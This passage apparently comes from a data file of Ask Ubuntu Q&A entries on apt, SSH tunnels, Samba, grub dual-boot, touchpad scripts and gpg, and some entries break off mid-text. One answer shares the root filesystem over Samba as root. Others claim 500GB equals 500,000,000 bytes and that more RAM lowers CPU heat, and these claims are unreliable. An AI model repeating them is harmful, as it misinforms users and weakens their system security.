/etc/bash.bashrc file is using by your system then no aliases , no auto tab completition , no colors.Nothing will work for you. \nIn case of over curiosity if you have deleted system wide /etc/bash.bashrc then also no problem, but the only feature that misses here is if you type some command which is not avaliable we used to get command-not-found but after deleting system wide bashrc you wont get even that. \nThat's all I know for now.\nHope it helps.\n", "Q: apt-get dist-upgrade want to remove most of my apps I hope there is someone out here who can help me.\nI am running Ubuntu 14.04. Last week I got a dependency issue when trying to do apt-get dist-upgrade. This was regarding the latest of python3-aptdaemon. After uninstalling it and installing it again, nothing changed. After some tries I installed python3-aptdaemon.pkcompat.\nAfter that I entered apt-get dist-upgrade again (also a new kernel was waiting for me), I entered 'Y' without reading all the text.

In other word,  Run the upgrade and don't worry,  you lose nothing. \nWhat's happening is that Ubuntu  needs to use a differernt repository for the newer version.\nNext,  I checked my PPA's to see if THEY updated their base and found that most had. I used YPPA,  its a great time saver. \nThen, afterwards I ran  'apt update && apt upgrade' , which installed a couple of  packages,  then I ran 'aot-upgrade'  a 2nd time,  but nothing got installed this time,  (I didn't think it would,  but the few seconds involved was worth it in my opinion.) \n", "Q: How to start `gnome-keyring-daemon` outside of Unity? I'm running Ubuntu with i3WM instead of Unity (while Unity is still available as a choice on the login screen).\ngnome-keyring-daemon works fine with Unity which starts it automatically.

The best way to do this is probably to use one of the gnome+i3 repositories floating around in order to launch i3 via a gnome-session. I have a work-in-progress home directory only solution (no system file edits) at https://github.com/dragon788/i3-gnome-homedir drawing on previous work by TheMarek, lvillani and MeanEYE (also on Github).\nI don't explicitly start the gnome-keyring stuff in mine (using gpg-agent and/or keychain instead), but you could potentially do it via .desktop files in ~/.config/autostart or adding the respective .desktop names minus the extension to ~/.config/gnome-session/sessions/gnome-plus-i3.session (in my repo above) to trigger during the session startup. The other repos with gnome+i3 may give you more examples to draw from.\n", "Q: Can anybody explain output of getent passwd command? mymac is my personal user account on juggernaut machine\nmymac:x:1000:1000:juggernaut,,,:/home/mymac:/bin/bash\n\nWhat does that x, 1000 , 1000 mean? And the commas that follow?\nIn analogy, also explain:\nroot:x:0:0:root:/root:/bin/bash\n\n\nA: From man 5 passwd:\n/etc/passwd contains one line for each user account, with seven fields\ndelimited by colons (“:”).

However, some\napplications which read the /etc/passwd file may decide not to permit\nany access at all if the password field is blank. If the password field\nis a lower-case “x”, then the encrypted password is actually stored in\nthe shadow(5) file instead; there must be a corresponding line in the\n/etc/shadow file, or else the user account is invalid.

I am building a Linux package for an application I have developed. I have it checking for updates when it starts, and installing updates via triggering sudo apt-get install <package>, which of course prompts the user for permission.\nWhat is the best practice/appropriate way to go about doing this? Is my current methodology common or ideal? If not, what should I do?\nI'm not looking for someone to do the work for me; I just want to be pointed in the right direction so that my app follows expected behaviour. Thanks a ton!\n\nA: You should provide a public repository, like a PPA, and rely on the package manager to find out about and install updates instead of doing that from within your program:\n\n\n*\n\n*To make your update being able to be installed via apt-get you need to run apt-get update first to load the updated package information. This can take quite some time and cause a lot of network traffic. \n\n*A normal user may not be able to use any apt-get command at all.\n\n*Your apt-getcalls may get blocked because another process is accessing the package manager, or it may block other processes from doing so.\n\n\nA: If you use a repository, you can probably depend on unattended-upgrades and add a configuration file to automatically download and install upgrades from your repository. For example, a file in /etc/apt/apt.conf.d named 60my-repo-upgrade, containing:\nUnattended-Upgrade::Allowed-Origins {\n    \"<origin>:<archive>\";\n};\n\nWhere <origin> and <archive> are from the Release file of your repository. can be obtained from the output of apt-cache policy.

However If I try to install it, and then run it from the installed copy it will freeze again on the ssh copy.\nThe above might suggest a configuration issue with mc that it cannot well handle.\n\nA: I use sshfs in midnight commander to copy a lot of files and there a few files where it reliably hangs, usually somewhere in the middle. My guess is that it's due to some magic byte pattern that hangs the connection somehow, maybe some ssh escape sequence that isn't being double escaped.\nI've had this issue for many years with many version of mc.\nhttps://midnight-commander.org/ticket/3236 claims it's fixed for 4.8.12 for someone, but it's still there in 4.8.17 for me.\n", "Q: How to set partition mounted for /boot with grub installed as boot partition in windows 8.1?

As far as I can tell, the up and down arrows control volume, while the left and right buttons seem to control back and forward pages in firefox. I know there used to be a way to fix this by editing the xorg.conf file, but it doesn't seem like you can edit xorg.conf like you used to be able to. Any ideas on how to stop this?\n\nA: This does not directly answer your question but is the much easier solution.\nThe easiest solution here is to just cover up the IR receiver - the IR beams won't be able to penetrate tape or paper put over the IR sensor.  That saves the headache of actually having to disable the sensor in system settings or by blacklisting drivers you may later want.\n", "Q: SSD extremely slow when connected with internal SATA, ok with external USB I have a brand new laptop (Asus N551VW, i7-6700HQ, 16 Gb ram) on which i installed Ubuntu 14.04 64bit and a new Samsung SSD 850 PRO 512Gb (latest firmware). I installed the default MySql 5.6.27 on the machine but I noticed a very VERY slow performance of the database (just creating a db and executing some migrations without any data takes around 33 seconds while on lower-hardware co-workers notebooks it takes like 3 seconds). Every sql statement seems to spend most time in \"system lock\" state, as i could see with a SHOW PROCESSLIST.\nI thought it to be an hard drive issue, but executing the hard drive benchmark in Ubuntu gives 500 Mb/s read and 350 Mb/s write speed, which looks mostly normal.    \nI also tried updating to the new 4.2 kernel, but the issue still there.\nTo make an experiment, i cloned the ssd on a normal hard drive, switched it in and connected the SSD externally with an usb box. I moved mysql data directory to the external disk, and retried the db creation: it took only 2.5 seconds!  \nJust out of curiosity i tried the same operation on an internal non-ssd disk: when the hd is plugged inside the laptop with sata, the database creation takes more than 2 minutes, while with the data dir on external usb (with the same physical disk) it took less than 10 seconds!  \nI'm really clueless on this.

So that's not expected to be sourced in a normal terminal. If you're unable to get it to work in a login shell that's because\n\n*Zsh sources ~/.zprofile, not ~/.profile.\n\n\nThe fact that the changes are lost after sourcing ~/.profile is expected, since what is sourced affects only the current shell; that's why ~/.profile / ~/.zprofile are sourced each time the shell starts.\nThe fact that it works when sourcing ~/.profile and not when sourcing ~/.zshrc is apparently unexplainable.\nMy guess is that an export / source is messing with PATH later / you're just running the wrong commands in ~/.zshrc.\n", "Q: What does the \"command\" command do?

Its making everything rather unusable)\nI've tried both unplugging my mouse and disabling the touchpad, to no avail.\nI've tried updating to ubuntu 15.10, but the issue persists.\nThis laptop has a touchscreen on the back of the regular screen, which I can't get to work with ubuntu, so I disabled it. However, I found out that if I touch the back of my screen it still reads the touch as if it was mirroring my screen upside-down. I tried to clean the back of the screen in case this was being caused by finger marks or the like, but it didn't solve the problem as well.\nThis doesn't happen in windows, and was not happening in ubuntu until last night. I hadn't installed anything new prior to that happening either.\nThe frequency in which this happens changes a lot, but I can't correlate it with anything except that it happens more often when I'm actually moving the mouse. It also happens when I'm only typing (with touchpad disabled) though. I'm assuming the OS is getting some \"fake positive\" inputs from the mouse, but I honestly have no idea what's going on.\nShould I try reinstalling mouse drivers like I'd do in windows?

If you suspend a process from the terminal with CTRL+Z everything from that process is suspended including the UI. \nBut if you interact with the UI while it is suspended the interactions are still captured and played through as soon as you unsuspend the process with a fg or bg is there a way to stop it from capturing or playing back the captured interactions?\n\nA: There's no way to do that without modifying the program source.

I put it into cron by @reboot /myssh.sh. The ssh opens a port on server.\nMy problem is : If the OS (office pc) suddenly dies and bootup again the cron will run the script again while the port on server still in use by previous session, and of course the ssh will fail (because it tries to open an open port on server). That's why I can't access the office pc from server if the office pc rebooted.\n\nThe questions:\n\n\n\n*\n\n*How to check ssh or port on server (and end the previous session) before reopen a reverse ssh again from office pc?\n\n*Do I have to do it by accessor-side(server) or host-side(office pc)?\n\n\n\nThe Goal\n\nI want the ssh tunnel keeps alive, no matter what happens. If internet connection lost, I still can access the office pc once the internet available. \n\nA: Use a control socket\nI just discovered what seems to be the most correct method from AutoSSH.\nHowever Multiplexing is a very big subject and can be used for other things. Source\nThe idea in Bash script to setup... is to use and integrated method called Control Socket. Through this method you can command an old connection to die. However you will have to test if this will work even after a reboot.\nWhat you are asking for:\nKill process on remote server\nThe tunnel is a process running on the remote machine. You can generate a script verifying that no previous instance of the tunnel is runnig.\nSuppose that ssh -f -R XXXXX:localhost:YYYYY user@server -N is your original command. XXXXX stands for the port used on the remote server and YYYYY the port on your local machine. \nThen you can check that no process is listening on port XXXXX on your remote server using lsof. However you will need to be able to use sudo in order to get the Process ID (pid) of the program listening on the port.\nAs soon as you find the pid using the port, you can just run at the server the command kill thePID.\nBash Script For getting the PID\nThe script bellow should should display the pid that is listening on XXXXX and save it on /tmp/remTunPID. If your user does not have sudo access it will not work, the PID will not be visible for security reasons.\nScript:\n#!/bin/bash\nrPort=XXXXX\ntheUser=[replace with remote user name]\nserver=[replace with your server]\nif [ -a /tmp/sshPID1 ]\n   then\n      rm /tmp/sshPID1\nfi\nif [ -a /tmp/sshPID2 ]\n   then\n      rm /tmp/sshPID2\nfi\nif [ -a /tmp/remTunPID ]\n   then\n      rm /tmp/remTunPID\nfi\necho \"Enter [sudo] password for ${theUser}:\"\nssh -t $theUser@$server \"sudo lsof -i tcp:${rPort} | grep  IPv4\" > /tmp/sshPID1\nwhile read -a A; do echo ${A[6]}; done < /tmp/sshPID1 > /tmp/sshPID2\ncat /tmp/sshPID2 | grep -v pass | tee /tmp/remTunPID\nif [ -s /tmp/remTunPID ]\n   then\n      thePID=$(cat /tmp/remTunPID)\n      echo The process $thePID is running at $server listening to $rPort\n   else\n      echo No process is listening on $rPort at $server\nfi\n\nChange the values of rPort, theUser and server to the values of your remote port, remote user and server(domain or IP) respectively.\nThis command will prompt you for your sudo password in order to continue, but don't worry if you understand a bit of bash you can see that it is being requested directly by ssh with the -t option.\nActually Kill the Process\nYou could add a command to this script inside the if then else fi statement to kill the process:\nif [ -s /tmp/remTunPID ]\n   then\n      thePID=$(cat /tmp/remTunPID)\n      echo The process $thePID is running on $server and listening on $rPort\n      echo Will attempt to kill $thePID\n      ssh $theUser@$server \"kill ${thePID}\"\n   else\n      echo No process is listening on $rPort\nfi\n\nThis should kill the process only if the port is being used. But it will kill the process even if your machine did not start the tunnel to begin with.\nAutoSSH\nAutoSSH seems to be a good tool to handle what you want to achieve. Maybe you should take a look.\nSOURCE\n", "Q: Everytime i tried something in console like sudo apt-get install build-essential i get all this!

How to make it editable in windows networking?\n\nBy default, your Samba users are not going to have write access to the\n  filesystem root. The easiest way to do this is to force a user. (Samba\n  users will access the share using the local user's privileges.) Make\n  sure that the user you specify has ownership and/or appropriate file\n  system permissions. For ease of use in my example, I'm using root.\n\n[root$]\npath = /\ncreate mask = 0755\nforce user = root\nbrowsable = yes\n\nAlso, be aware that certain default samba configurations include this line:\ninvalid users = root\n\nWhich you should remove if you REALLY want to access the remote's system root folder, which I personally discourage for security reasons. I'd rather recommend accessing the remote file system with SSH or even with Gigolo (SSHFS).\nEDIT\nI'm able to access (read-only) the root folder of another computer with this share configuration:\n[Root]\n   comment = Root\n   path = /\n   guest ok = no\n   browseable = yes\n   public = yes\n\nSo if you are not interested in having write permissions, just use that instead.\n", "Q: Mount errors when trying to open a DVD - is the unit broken?

After that, I added the gnome 3 staging ppa and upgraded gnome-shell from v3.10 to v3.12 from there. Now, when I run apt-get autoremove, I get these packages in the list:\nThe following packages were automatically installed and are no longer required:\n  evolution-indicator gdm gir1.2-gkbd-3.0 gir1.2-tracker-0.16 gir1.2-xkl-1.0 libgtksourceview2.0-0\n  libgtksourceview2.0-common libiptcdata0 libtracker-extract-0.16-0\n  libtracker-miner-0.16-0 libtracker-sparql-0.16-0 linux-headers-4.2.0-23\n  linux-headers-4.2.0-23-generic linux-image-4.2.0-23-generic\n  linux-image-extra-4.2.0-23-generic python-gtksourceview2\n\nAs I understand, gdm is a critical package which is very much needed as I'm using the gnome-shell. I've also looked at this answer which suggests marking a package as \"needed\" by just running apt-get install <package>. But how do I know which packages of this list I can safely remove without affecting my system? I know for a fact, however, that I don't need linux-image-* and linux-headers packages as I've already upgraded to later kernel versions. But how do I know about the rest of the packages?\n\nA: the command apt-cache showpkg <package> will tell you the packages \"reverse depends\" i.e. what other packages - in your configured repositories (not necessarily installed packages) -  depend on that package.\nIn the case of gdm there are alot, so I wrote this script to iterate through all of the reverse dependencies to check if any were installed - which would indicate that you probably shouldnt remove gdm.  \n#!/bin/bash\n\npackage=$1\n\napt-cache showpkg $package | sed '1,/Reverse Depends:/d;/Dependencies:/,$d'  > /tmp/dependencies.txt\n\nwhile read line\ndo\n    reverse_dependency=$(awk -F '[:,]' '{print $1}' <<< $line)\n    if dpkg -s $reverse_dependency &> /dev/null\n    then\n        echo \"$line is installed and depends on $package\"\n    fi\ndone < /tmp/dependencies.txt\n\nIf you invoke the script you need to pass the package as a parameter i.e.\n./script \"gdm\"\n\nOn my machine the result was\n$ ./script.sh gdm\nplymouth:i386,gdm 3.0.4-0ubuntu11 is installed and depends on gdm\nplymouth,gdm 3.0.4-0ubuntu11 is installed and depends on gdm\nplymouth:i386,gdm 3.0.4-0ubuntu11 is installed and depends on gdm\nplymouth,gdm 3.0.4-0ubuntu11 is installed and depends on gdm\n\n", "Q: What is the difference between /: and : in vi? Is the a difference between /: and : in vi?\n\nA: Are you referring to vi commands?\nTyping : in the vi command prompt means that you are going to write vi commands. For instance:\n:x == save and exit \n:w == save, \n:q == quit, \n:s/// == search and replace, etc.\nTyping / means performing a search. So /: means that you are searching for an instance of \":\" (colon) in your file.\n\nA: Vi have two modes of operation:\n\n\n*\n\n*Command Mode \n\n*Insert Mode\n\n\nIn command mode, the letters of the keyboard perform editing functions (like moving the cursor, deleting text, for example). To enter command mode, press the Esc key.\nIn insert mode, the letters you type form words and sentences. Unlike many word processors, vi starts up in command mode.\nWhat does entering the : key mean in Vi/M editors?\nThe vi editor editor is built on an earlier Unix text editor called ex. ex commands can be used within vi. ex commands begin with a : (colon) and end with a . The command is displayed on the status line as you type. Some ex commands are useful when saving and closing files.\nTo save the edits you have made, but leave vi running and your file open:\n\n\n*\n\n*Press Esc\n\n*Type :w\n\n*Press Return.\n\n\n/ is used for searching while in command mode\n\n\n*\n\n*Type / (slash).\n\n*Enter the text string you want to search for in the file.\n\n*Press Return.\n\n\nSo /: will search for the \":\" character in subject file, while : will take user to command mode, where ex commands can be executed.\n", "Q: Windows doesn't start anymore from the grub boot menu I have an SSD with 2 partitions. \nThe first partition belongs to Windows 10 and it worked fine.\nI installed Ubuntu 15.10 on the second partition and it also works fine.\nWhen I boot, grub is correctly displayed and shows both Windows and Ubuntu. If I select Ubuntu it can boot without issue and I can even access the Windows partition from Ubuntu, but if I try to boot Windows 10 it displays a black screen (like it will start normally) for a few seconds (perhaps 2 or 3 seconds) and then it goes back to grub without showing any message. \n\nA: Edit /boot/grub/grub.cfg\nFind the Windows menu entry (looks like)\n### BEGIN /etc/grub.d/30_os-prober ###\nmenuentry 'Windows 10 (loader) (on /dev/sdXX)'\n\nAfter \nchainloader +1\n\nWrite\nntldr /bootmgr \n\nIt did the trick.\n\nA: First of all you upgrade your grub.\n    sudo update-grub2\n\nIf the above command didn't work,\nThen you download a windows iso file and also install 'winusb' application which is used to make bootable images of windows, if you have a cd it's fine.\nRemember the partition name of your ubuntu.\nNow you from from windows usb or cd. Now you click on repair this pc and troubleshooting startup options.\nIt will automatically replace your grub and now you will be able to boot into windows but not into ubuntu.\nNow you either install a brand new ubuntu or try working around with reparing it.\nIf you are going to install brand new ubuntu then i would suggest you to install the boot-loader(Grub2) on the root file system itself.\nThen you install EasyBcd application for windows and then link the boot loader to the ubuntu partition, as this the safest way to go on, so that if you have any updates of grub or windows boot-loader there wouldn't be any trouble for you in future.\nClick here To watch a video about installing in the safest way.\nI have installed 5 Linux Systems and 1 Windows os using the method mentioned above, I haven't got any problem till now.\n\nA: This problem is of windows not ubuntu.\nI solved this problem by following steps:\n1.First selected windows at grub boot menu.\n2.Sometimes it go to automatic repair and from that select Troubleshoot -> Advanced options.\n3.Select startup repair and it will repair windows.\n4.Now simply open windows from boot and it will boot windows normally.\n\n\nA: this worked for me:\n\n\n*\n\n*install win 8/10\n\n*boot on a live linux cd (i used boot-repair-disk-64bit.iso), any from where you can run gparted.\n\n*shrink the win partition to make room for your linux.\n\n*AND NOW THE REALLY IMPORTANT: restart windows, and then open file explorer (the yellow one) and see that your drive C: still thinks it owns the whole disk.\n\n*right click on drive C: and chose properties/tools and click check.\n\n*now windows will check and verify the new size of the win partition.\n\n*you may have to reboot in to win a couple of times, but finally win knows the size and position of its partition(s)\n\n*now you can install ubuntu or whatever - and should it not work, boot-repair-disk-64bit.iso will make it work fast.\n\n", "Q: keybind to toggle touchpad in lubuntu (openbox) I'm using lubuntu.\nI want to add a shortcut to toggle (turn on and off) my touchpad.\nI know I need to edit the xml file in ~/.config/openbox (in my case it's lubuntu-rc.xml) as described here and here\nI want it to trigger it when Fn and F5 are pressed (on my dell there is a touchpad icon on it, so I assume it triggers also a x86 keybind, dunno if that matters)\non my machine\n synclient TouchPadOff=1\n\nturns off the touchpad, and\n  synclient TouchPadOff=0\n\nturns it on again.\nThe command\nsynclient\n\nwithout any options, returns this list\nParameter settings:\n    LeftEdge = 300\n    RightEdge = 1700\n    TopEdge = 210\n    BottomEdge = 1190\n    FingerLow = 12\n    FingerHigh = 15\n    MaxTapTime = 180\n    MaxTapMove = 107\n    MaxDoubleTapTime = 180\n    SingleTapTimeout = 180\n    ClickTime = 100\n    EmulateMidButtonTime = 75\n    EmulateTwoFingerMinZ = 141\n    EmulateTwoFingerMinW = 7\n    VertScrollDelta = 48\n    HorizScrollDelta = 48\n    VertEdgeScroll = 1\n    HorizEdgeScroll = 0\n    CornerCoasting = 0\n    VertTwoFingerScroll = 1\n    HorizTwoFingerScroll = 0\n    MinSpeed = 1\n    MaxSpeed = 1.75\n    AccelFactor = 0.0819336\n    TouchpadOff = 0\n    LockedDrags = 0\n    LockedDragTimeout = 5000\n    RTCornerButton = 2\n    RBCornerButton = 3\n    LTCornerButton = 0\n    LBCornerButton = 0\n    TapButton1 = 1\n    TapButton2 = 3\n    TapButton3 = 0\n    ClickFinger1 = 1\n    ClickFinger2 = 1\n    ClickFinger3 = 0\n    CircularScrolling = 0\n    CircScrollDelta = 0.1\n    CircScrollTrigger = 0\n    CircularPad = 0\n    PalmDetect = 0\n    PalmMinWidth = 10\n    PalmMinZ = 100\n    CoastingSpeed = 20\n    CoastingFriction = 50\n    PressureMotionMinZ = 15\n    PressureMotionMaxZ = 80\n    PressureMotionMinFactor = 1\n    PressureMotionMaxFactor = 1\n    ResolutionDetect = 1\n    GrabEventDevice = 1\n    TapAndDragGesture = 1\n    AreaLeftEdge = 0\n    AreaRightEdge = 0\n    AreaTopEdge = 0\n    AreaBottomEdge = 0\n    HorizHysteresis = 12\n    VertHysteresis = 12\n    ClickPad = 0\n\nas you can see, there is the line \"TouchpadOff = 0\".\nSo what I'm basically asking for is someone who knows how to work grep and regular expressions to tell me how to write a shell script that reads the output of snyclient and  executes \"synclient TochPadOff=0\" or \"synclient TochPadOff=1\" accordingly.\nIf found this script that does something very similar , but I'm struggeling on the grep part.\nIf found a generic toggle script , but I think grepping the info is cleaner.\nI also already know how to bind a shellscript to a keyboardshortcut from that example.\nhelp greatly appreciated . \n\nA: This works for me:\n  #!/bin/sh\n  TOGGLE=$HOME/.toggle\n\n  if [ ! -e $TOGGLE ]; then\n    touch $TOGGLE\n    synclient TouchPadOff=1 &\n  else\n    rm $TOGGLE\n    synclient TouchPadOff=0 &\n  fi\n\nexit 0\n\nThere doesn't seem to be need for grep.

When I turned the computer back on and went back into Transmission to resume downloading I got the message:\nError no data found! Ensure your drives are connected or use \"set location\"\nI'm not sure why this happened as the drives were never physically disconnected, but maybe perhaps I launched Transmission before they were mounted. In an attempt to fix this, I restarted the computer and allowed the drives to mount before starting Transmission, but I still got the same error about the missing data.\nIn attempt to fix this, I tried the following:\nRight clicking the torrent in Transmission, then clicking \"Set Location\", selecting 'data is already there' radio button, and then navigating to the folder where the data is. (I made sure I pointed Transmission to the parent directory where the data was downloading to. To double check where Transmission thought the data was, I right clicked the torrent in Transmssion, went to properties, and looked at LOCATION, which showed exactly where I told it to set the folder to.\nAfter setting the location to where the files were I right clicked on the torrent and clicked 'Verify Local Data', but nothing seemed to happen after that and the error remained.\nI also did the above actions with 'Move Data File To' the location, with no results either.\nSTILL NO LUCK.\nSo, the only thing I can think of at this opint is something I read on another site about the files.

Try to reduce it. On running virtual machines in any laptops (using i3) will probably overheat your laptop and also makes your fan's speed to increase to improve the cooling rate.\nTo solve this issue the driver which you installed is not the solution. Because it may cause your fan to undesired effects. Your problem may be due to the RAM capacity.\nBefore RAM upgrade\nI used my lenovo laptop using i3 3110M ivy-bridge processor with 2GB RAM, 1GB dedicated NVidia graphics processor for running High-end games and virtual machines which made overheating of 70 to 78 degrees of Celsius with high-speed sounds from fan.\nI came to know this will seriously reduce the life of the laptop. After searching many forums and websites i found that increasing the RAM capacity will not only boost the performance and speed of the system but it will also increase the life of CPU due to overheating. \nAfter RAM upgrade\nAfter upgrading the RAM capacity of my laptop from 2GB to 6GB system became smoother and the temperature reduced to 54 degree celcius which is normal.\nNormal CPU temperature details can be found here. Your laptop is probably ivybridge. See its range.\nhttp://www.buildcomputers.net/cpu-temperature.html\nI advice upgrade your RAM from 4 GB to 6 GB or 8 GB for usage of VM(Emulators also) and High graphical purposes.\n\nA: You could install thermald if you are concerned about the CPU overheating. Thermald will monitor thermal zones and will turn on various passive and active cooling mechanisms if it detects an overheating system.

QtCreator (3.0.1, Ubuntu 14.04 LTS) allows the installation of C++ code Beautifier \"Uncrustify\", for reformatting existing code.  This all looks simple from instructions http://doc.qt.io/qtcreator/creator-beautifier.html, but I am stuck on basic inability to install.\nI have downloaded, compiled and installed the latest uncrustify-0.61.  This creates the executable etc. fine, and installs in system area.\nThe instructions then state:\n\nSelect Help > About Plugins > C++ > Beautifier to enable the plugin.\n\nWell, there is no \"Beautifier\" plugin showing under C++.  Hardly surprising, since building/installing \"Uncrustify\" does not do anything to \"tell\" Qt Creator it is there/available.  How do you get Qt Creator to know the plugin is available to Load?\nIn have searched everywhere on the web for help.  My guess is that in directory /usr/lib/x86_64-linux-gnu/qtcreator/plugins/QtProject there needs to be a file like Uncrustify.pluginspec (plus anything else), but there is no mention of this.  I have scoured the web for anything to show how to actually install and make it work, but found nothing more than the instructions above, which do not work.\n\nA: Well, turns out this is an issue for the C++ Beautifier plugin in general rather than \"Uncrustify\" in particular, and a Qt Creator version-too-old.\nThe files required are Beautifier.pluginspec and libBeautifier.so.\nAlthough I was being directed to the \"Beautifier\" Help from the Qt Creator Version 3.0.1 which gets installed from the Ubuntu 14.04 LTS Software Centre, Beautifier support was only introduced at Qt Creator 3.1 --- though that is hard to discover from web searching.\nSo at Ubuntu 14.04 LTS, either Beautifier is simply not available by default, or you can go replace the shipped 3.0.1 Qt Creator with an Open Source 3.1+, or maybe just pick those 2 files out of a 3.1 distribution/installation and see if they work OK under 3.0.1.\n", "Q: Gnome 3 screwed up Unity, especially Nautilus I wanted to try gnome 3 in my Ubuntu 14.04 LTS (which had unity).

There were only options to enable individual icons such as home, network etc...\nAfter rummaging for a while I found it under gnome/desktop/background.

So, according to these manufacturers, a 500GB drive would be 500,000,000 bytes.\nHowever, operating systems (with the exception of Mac OS) measure storage in steps of 2¹⁰ (1024), so 1 kilobyte would be 1,024 bytes instead.\nThis means that the hard drive will actually have less capacity according to the OS than what is advertised by the manufacturers. Manufacturers have done this since very early in the IT industry's history, to save money and make their drives seem larger than they actually are. Combine this deception with the lost space upon formatting, and you get proportionally less total space than the manufacturer advertises.\nOn top of this, operating systems take up some space for their system files, leaving the user with even less.\n;-)\n", "Q: Recover unreadable directory on ext4 partition One of my directories in a ext4 filesystem on my SSD became unredable and I need to recover the files.\nHere is what I did to crash the filesystem:\nI accidentally created 1.5 million small files in the directory and then deleted them with a find . -name \"xyz*\" -delete.\nWhen I noticed the the directory file remaind huge, I booted into a live system (Ubuntu 14.04) and did an fsck -D /dev/sdb1 to shrink the directory. No errors.\nAfter booting my real system again, the partition was only mounted read-only and every subsequent run of fsck -f -y /dev/sdb1 complains about the same errors that a directory block contains unallocated blocks and claims to fix it.\nUnfortunately the next run of fsck shows the exact same errors as if the changes weren't written to disk at all. When I try to cd into the directory I get an error that it is unreadable.\nI'm now in the process to cread a copy of the partition.\nWhat are my options to fix the directory? Is single file recovery with foremost or magicrescue my only option ? Or is there a tool that could try to recover the whole directory (besides fsck) ?\n\nA: The fsck.ext4 shipped with Ubuntu 15.10 is much better than the version shipped with 14.04 and was able to recover the file system.\nMany files are now in lost+found, but at least nothing seems to be completely lost.\n", "Q: How to change keyboard shortcut of \"Show location of pointer\"? I am running Ubuntu GNOME 15.10 with GNOME 3.18 and in the gnome-tweak-tool there is an option called Show location of pointer, which upon clicking CTRL makes a little circle thing come off like a ripple from the mouse pointer in order to show its location. Now this is all very useful and that, but I would find it more useful if I could reassign this useful feature to another keyboard shortcut, can this be done?\n\nA: Unfortunately, you'll have to compile your own version of the Gnome settings deamon to accomplish this: the key value is hard-coded in gsd-locate-pointer.c.\nAlternatively, you could map an unused key or key combination to xdotool key 'Control_R'.\n\nA: 2021 UPDATE:\nBase on the 2 years old discussion here. Starting from GNOME 3.36 (I think) the key binding of locate-pointer can be remapped. It lies under /org/gnome/mutter/locate-pointer-key key.\nTo change it (for example remapping it to Right Shift instead):\ngsettings set org.gnome.mutter locate-pointer-key Shift_R\n\nDon't forget to enable it before using.\ngsettings set org.gnome.desktop.interface locate-pointer true\n\nTested on Ubuntu 21.04.\n", "Q: Ubuntu 15.10 - Crashes when plugging external monitor (Asus ux501jw-dh71) Just got a new Asus ux501jw-dh71 laptop.

Let assume that I have a list of three key pair on my bash screen when I run the following commands:\ngpg2 --list-keys\n\nand\ngpg2 --list-secret-keys\n\nMy question is, when I run the following command to verify a signed file, which key pair is used by this tool?\ngpg2 --verify test.sig\n\nDoes it check all the signing keys one by one to find a matched one or finish all the keys?\n\nA: An OpenPGP signature includes a reference to the key used for signing.

In this case, GnuPG has to try all available encryption keys to decrypt the message.\nFurther keys might be involved for validating the signature, which means finding trust paths in the web of trust: but this is another, large topic.\n", "Q: DHCP IP address changes automatically My Dell precision M4800, running Ubuntu 14.04 LTS, periodically changes its IP address.

You don't say so I am assuming that. In a typical setup your best bet is to choose a high address like x.x.x.240 so there won't be a  conflict with other devices (you don't have 250 devices connected do you?). If you do that you likely won't have to reserve an address on the router.\nThen enter settings like this:\n\n\nEDIT 2: Based on a comment, the OP needs to have a DHCP config using eth0 at work. It's possible to create a second config, say eth_work, that uses DHCP, and modify eth0 as above, then just choose the one you need based on location/environment.\n\nEDIT I see in a comment you have a Verizon router -- so of course, not sure if it's relevant, we are talking about your LAN ip addresses. The WAN address can change from time to time (router restart or other times) unless you pay them for a fixed IP address.

I've installed Ubuntu Server 15.10.\nI've been trying and doing some research but I couldn't make the SSH work from an external computer, it always returns \"Connection refused\"\nIt works fine if I try from a LAN computer.\nI've installed no-ip in order to get an easier address.\nRegarding port forwarding, I have changed the port and I did the port forwarding from the router's webpage (192.168.1.1). I've checked in a website and it says my port is open.\nThe server is connected via ethernet from the router.\nI have 4 computers connected to my router. Since my external IP is the same from all computers, how does the ssh knows which computer to connect? How can I know to which computer am I connecting?\nI've realized how to know to which computer I am connecting to, but I still can't connect\n\nA: Does your router support DMZ network. I recently set up my webserver on my home router. And instead of port forwarding, I used my servers static ip in the DMZ zone. This way my server is connected to my public ip. And i can ssh from outside using the public IP too. Just make sure that using DMZ exposes the server to outside world so dont forget to install a firewall (i use shorewall) and just open ports you want. For ssh open 22.\nThats it. Regarding port forwarding i guess you'll get good suggestions from other community members.\nIf you have any questions regarding ssh to server iin DMZ of your router.

In the tests http://bazaar.launchpad.net/~unity-team/unity-scopes-api/trunk/view/head:/test/gtest/scopes/OnlineAccountClient/OnlineAccountClient_test.cpp a shared_ptr is already being created before calling the OnlineAccountClient constructor, which is needed for the shared_from_this() method call done by this constructor.\nThus: I could be wrong or leaving something out, but are we lacking this kind of factory for node.js access? Does a workaround (like node.js addon for your project) make sense?

After reboot I could see the pairing, but couldn't reconnect.

Any way I can get Ubuntu back?\nTestdisks shows my partitions look like this\nand sda looks like this\nTIA!\n\nA: It looks at first glance like Windows 10 did not rewrite the partition table of your drive, so the Master Boot Record was all that was changed. What you need to do is restore the MBR which I believe can be done with a Linux tool called \"gparted\". You may have to download this tool. http://gparted.org/download.php Heed all warnings it gives you. Back up all data and back up the present (bad) MBR. You can run gparted from a USB, once you boot in a USB running ubuntu, or boot from the live CD or USB made with the ISO available on the site. This means making a live ISO image on a CD or USB and booting from the USB in order to run gparted. There is also a free tool to restore MBR's which runs on windows, but I doubt that you will be able to restore the old MBR from windows. Always work with a backed up MBR. Windows installations have a mind of their own. What worked for me was downloading an ISO of ubuntu which was bootable by selecting the USB and then using a loaded copy of gparted on that USB. You cannot change a mounted drive with a partition manager, so unmount the drive in order to repartition or change the MBR to one booting Linux and windows. Since your partiation table seems to be still intact, I would advise just making a new MBR which is dual boot.\n\"The best way to access all of the features of the GParted application is by using the GParted Live bootable image. GParted Live enables you to use GParted on GNU/Linux as well as other operating systems, such as Windows or Mac OS X. \"\nFixing Operating System Boot Problems\n\"Your computer might fail to boot an operating system when you perform one of the following actions:\nDelete a partition.\n\nMove a partition.\n\n***Install another operating system and overwrite the Master Boot Record (MBR).*** \n\nFortunately the failure to boot can be often be fixed.\nIf your computer uses the GRUB boot loader, see the section called “Fixing GRUB boot problem” to restore the ability to boot.\nIf your computer does not use GRUB then you are advised to consult documentation for your boot loader to learn how to fix the problem. You might consult the GParted FAQ, or the GParted forum. You might also search the Internet to learn how other people have solved similar problems\"\nFixing GRUB boot problem\nThe Grand Unified Boot loader (GRUB) is used by many GNU/Linux distributions. To fix GRUB boot problems you start by determining which major version of GRUB was used.\nThere are two major versions of GRUB:\nGRUB, also known as GRUB 2, covers versions 1.98 and higher. GRUB 2 works with both GUID partition tables (GPT) and 